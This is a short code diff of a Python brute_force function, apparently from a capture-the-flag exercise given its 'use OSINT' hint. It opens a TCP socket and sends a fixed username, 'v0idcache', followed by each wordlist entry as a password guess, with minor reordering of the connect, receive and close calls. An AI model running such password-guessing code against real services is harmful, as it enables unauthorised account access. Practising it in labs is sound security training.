@@ -43,22 +43,21 @@ def brute_force():
     """
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host,port));
+    
 
     username = "v0idcache"   # Hint: use OSINT
-    password = ""
+    
     f = open(wordlist)
-
+    s.connect((host,port));
     for line in f:
-		s.send(username)
+        data = s.recv(2048)
+        print(data)
+	s.send(username)
     	s.send(line)
 
-    	data = s.recv(1024)
-    	print(data)
-
+    s.close()
     f.close()
 
-    s.close()
 
 
 
